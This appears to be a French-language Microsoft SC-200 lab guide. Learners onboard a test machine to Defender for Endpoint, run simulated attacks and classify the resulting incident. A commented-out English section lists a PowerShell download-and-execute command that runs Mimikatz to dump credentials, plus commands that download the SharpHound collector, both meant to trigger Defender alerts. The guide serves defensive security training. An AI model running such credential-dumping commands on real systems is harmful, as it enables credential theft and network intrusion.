---
lab:
  title: "Exercice 2\_-\_Atténuer les attaques avec Micrsoft Defender for Endpoint"
  module: Learning Path 2 - Mitigate threats using Microsoft Defender for Endpoint
---

# Parcours d'apprentissage 2 - Labo 1 - Exercice 2 - Atténuer les attaques avec Microsoft Defender for Endpoint

## Scénario du labo

![Vue d’ensemble du labo](../Media/SC-200-Lab_Diagrams_Mod2_L1_Ex2_10_19.png)

Vous êtes un analyste des opérations de sécurité travaillant dans une entreprise qui implémente Microsoft Defender pour point de terminaison. Votre responsable prévoit d’intégrer quelques appareils afin de fournir des informations sur les modifications requises des procédures de réponse de l’équipe chargée des opérations de sécurité.

Pour explorer les fonctionnalités d’atténuation des attaques Defender for Endpoint, vous allez exécuter deux attaques simulées.

>**Remarque :** Une **[simulation de labo interactive](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** est disponible et vous permet de progresser à votre propre rythme. Il peut exister de légères différences entre la simulation interactive et le labo hébergé. Toutefois, les concepts et idées de base présentés sont identiques.


### Tâche 1 : Vérifier l’intégration de l’appareil

Dans cette tâche, vous allez confirmer que l’appareil a été intégré avec succès et créer une alerte de test.

1. Si vous n’êtes pas encore sur le portail Microsoft Defender XDR dans votre navigateur Microsoft Edge, accédez à https://security.microsoft.com) et connectez-vous en tant qu’administrateur pour votre tenant.

1. Dans le menu de gauche, sous la zone **Ressources** , sélectionnez **Appareils**. Veuillez patienter jusqu’à ce que WIN1 apparaisse sur la page Appareils avant de continuer. Sinon, vous devrez peut-être répéter cette tâche pour voir les alertes qui seront générées ultérieurement.

    >**Remarque :** si vous avez terminé le processus d’intégration et que vous ne voyez pas d’appareils sur la liste Appareils au bout d’une heure, cela peut indiquer un problème d’intégration ou de connectivité.

1. Sélectionnez **Paramètres** dans la barre de menus de gauche, puis, sur la page Paramètres, choisissez **Points de terminaison**.

1. Sélectionnez **Intégration** dans la section Gestion des appareils, puis vérifiez si *« Windows 10 et Windows 111 »* est sélectionné comme système d’exploitation. Le message *« Premier appareil intégré »* affiche désormais *Terminé*.

1. Faites défiler la page vers le bas puis, sous la section *« 2. Exécuter un test de détection »,* puis copiez le script de test de détection en sélectionnant le bouton **Copier**.  

1. Dans la barre de recherche Windows de la machine virtuelle WIN1, tapez **CMD** et choisissez **Exécuter en tant qu’administrateur** dans le volet droit de l’application Invite de commandes. 

1. Lorsque la fenêtre « Contrôle de compte d’utilisateur » apparaît, sélectionnez **Oui** pour autoriser l’exécution de l’application. 

1. Collez le script en cliquant avec le bouton droit dans les fenêtres d’invite **Administrateur : Invite de commande**, ppuis appuyez sur **Entrée** pour l’exécuter.

    >**Remarque :** la fenêtre se ferme automatiquement après l’exécution du script.

### Tâche 2 : Attaques simulées

>**Remarque :** Le labo d’évaluation et la section Tutoriels et simulations du portail ne sont plus disponibles. Les étapes suivantes sont fournies à titre de référence uniquement. Reportez-vous au **[simulation de labo interactive](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** pour une démonstration des attaques simulées. Nous œuvrons pour trouver un remplacement aux attaques simulées.

<!--- In this task, you will run two *simulated* attacks using *PowerShell* on *WIN1* to explore the capabilities of Microsoft Defender for Endpoint.

`Attack 1: Mimikatz - Credential Dumping`

1. On the *WIN1* machine, type **Command** in the search bar and select **Run as administrator**.

1. Copy and paste the following command in the **Administrator: Command Prompt** window and press **Enter** to run it.

    ```CommandPrompt
    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
    ```

1. You should see a message that says *Access is denied*, and a pop-up message from `Microsoft Defender Antivirus, Windows Security Virus and threats protection` displaying *Threats found*.

1. Exit the **Administrator: Command Prompt** window by typing **exit** and pressing **Enter**.

`Attack 2: Bloodhound - Collection`

1. On the *WIN1* machine, type **PowerShell** in the search bar, select **Windows PowerShell** and select **Run as administrator**.

1. Copy and paste the following commands in the **Administrator: Windows PowerShell** window and press **Enter** to run it.

    ```PowerShell
    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

    >**Note:** It is recommended to copy, paste and run the commands one at a time. You can open *Notepad* and copy the commands into a temporary file to accomplish this. The first command creates a folder named *ExternalPayloads* in the same folder where the *Atomic Red Team* folder is located. The second command downloads the *SharpHound.ps1* file from the *BloodHound* GitHub repository and saves it in the *ExternalPayloads* folder.

1. You should see a  pop-up message from `Windows Security Virus and threats protection` displaying *Threats found*.

1. Copy and paste the following command in the **Administrator: Windows PowerShell** window and press **Enter** to run it.

    ```PowerShell
    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

1. If the output is *True*, the Malware payload file has not been removed by Microsoft Defender Antivirus. If the output is *False*, the Malware payload file has been removed by Microsoft Defender Antivirus. Use the up-arrow key to repeat the command until the output is *False*. --->

1. Dans le menu de gauche, sous **Points de terminaison**, sélectionnez **Évaluation et tutoriels** , puis **Tutoriels et simulations** à gauche.

1. Sélectionnez l’onglet **Tutoriels**.

1. Sous *Investigation automatisée (porte dérobée)* ,un message décrivant le scénario s‘affiche. Sous ce paragraphe, cliquez sur **Lire la procédure pas à pas**. Un nouvel onglet de navigateur apparaît. Il content des instructions pour effectuer la simulation.

1. Dans le nouvel onglet du navigateur, recherchez la section intitulée **Exécuter la simulation** (page 5, à partir de l’étape 2) et suivez les étapes pour mener l’attaque. **Conseil :** le fichier de simulation *RS4_WinATP-Intro-Invoice.docm* figure sur le portail, juste sous la **procédure pas à pas** que vous avez sélectionnée à l’étape précédente en choisissant le bouton **Obtenir le fichier de simulation**.

<!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->

### Tâche  3 : Examiner les attaques

1. Dans le portail Microsoft Defender XDR, sélectionnez **Incidents et alertes** dans le menu de gauche, puis **Incidents**.

1. Un nouvel incident appelé « Plusieurs familles de menaces ont été détectées sur un point de terminaison » se trouve dans le volet droit. Sélectionnez le nom de l’incident pour charger ses informations.

    >**Remarque :** Vous devez voir les alertes *Bloodhound* et Mimikatz* dans le volet **Alertes**. Dans **Ressources/Appareils**, l’ordinateur *win1* a désormais un **Niveau de risque** *Élevé*.

1. Sélectionnez le bouton **Gérer l'incident** .Un nouveau panneau de fenêtre s’affiche. 

1. Sous **Balises d’incident**, tapez « Simulation », puis sélectionnez **Simulation (Créer)** pour créer une balise. 

1. Sélectionnez le bouton bascule **Attribuer à** et ajoutez votre compte d’utilisateur (Moi) en tant que propriétaire de l’incident. 

1. Sous **Classification**, développez le menu déroulant. 

1. Sous **Informational, activité  attendue**, sélectionnez **Test de sécurité**. 

1. Ajoutez des commentaires si vous le souhaitez, puis sélectionnez **Enregistrer** pour mettre à jour l’incident et quitter la page.

1. Passez en revue le contenu des onglets  *Histoire d’attaque, Alertes, Ressources, Investigations, Preuve et réponse* et *Résumé*. Les appareils et les utilisateurs sont répertoriés sous l’onglet *Ressources* . L’onglet *Histoire d’attaque* affiche le *graphique Incident*. Conseil ** :** certains onglets peuvent être masqués en raison de la taille de votre écran. Sélectionnez l’onglet représentant des points de suspension (...) pour les afficher.

    >**Avertissement :** Les attaques simulées ici constituent une excellente source d’apprentissage via la pratique. Effectuez uniquement les attaques dans les instructions fournies pour ce labo lors de l’utilisation du cours fourni au tenant Azure.  Vous pouvez effectuer d’autres attaques simulées *après* avoir effectué ce cours de formation avec ce tenant.

## Vous avez terminé le labo.
